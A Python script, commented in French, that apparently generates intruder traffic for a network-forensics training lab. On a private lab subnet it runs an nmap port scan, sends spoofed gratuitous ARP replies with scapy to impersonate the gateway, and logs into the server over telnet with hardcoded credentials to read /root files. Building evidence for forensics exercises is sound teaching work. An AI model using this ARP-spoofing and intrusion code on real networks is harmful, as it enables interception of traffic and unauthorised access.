#!/usr/bin/env python3
"""Poste de l'intrus - 10.13.37.66.

Timeline :
  - scan de ports SYN du serveur interne (signature visible : SYN -> RST)
  - ARP gratuit usurpant la passerelle .1 (positionnement MITM, defi bonus)
  - intrusion : session telnet en clair (login + mot de passe + commandes)
"""
import socket
import subprocess
import time

SRV = "10.13.37.50"
GATEWAY = "10.13.37.1"


def arp_spoof():
    """Defi bonus (MITM) : annonce que la passerelle .1 est a la MAC de l'intrus.

    On emet quelques reponses ARP gratuites "10.13.37.1 is-at <MAC intrus>".
    Dans le scelle 01 (sonde du serveur .50), un poste se fait donc passer pour
    la passerelle : signature classique d'empoisonnement ARP / homme du milieu
    (Wireshark peut signaler "duplicate use of IP address detected").
    """
    try:
        from scapy.all import ARP, Ether, conf, get_if_hwaddr, sendp
    except Exception:
        return
    iface = conf.iface
    mac = get_if_hwaddr(iface)
    pkt = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / ARP(
        op=2, psrc=GATEWAY, hwsrc=mac, pdst=SRV
    )
    sendp(pkt, iface=iface, count=4, inter=0.3, verbose=False)


def telnet_session():
    s = socket.create_connection((SRV, 23), timeout=10)
    s.settimeout(3)

    def expect():
        try:
            return s.recv(4096)
        except socket.timeout:
            return b""

    def send(line):
        s.sendall((line + "\r\n").encode())
        time.sleep(0.5)

    expect()              # banniere + "login: "
    send("admin")
    expect()              # "Password: "
    send("Adm1n-NordExport!")
    expect()              # message d'accueil + prompt
    for cmd in ("id", "ls /root", "cat /root/notes.txt", "exit"):
        send(cmd)
        expect()
    s.close()


def main():
    t0 = time.time()

    # --- Scan de ports (P4, partie 1) ---
    delay = 18 - (time.time() - t0)
    if delay > 0:
        time.sleep(delay)
    subprocess.run(
        ["nmap", "-sT", "-Pn", "-n", "-p", "1-100,443", SRV],
        check=False,
    )

    # --- Positionnement MITM : ARP gratuit (defi bonus) ---
    delay = 22 - (time.time() - t0)
    if delay > 0:
        time.sleep(delay)
    arp_spoof()

    # --- Intrusion telnet (P4, partie 2) ---
    delay = 26 - (time.time() - t0)
    if delay > 0:
        time.sleep(delay)
    telnet_session()

    print("intrus: termine")


if __name__ == "__main__":
    main()
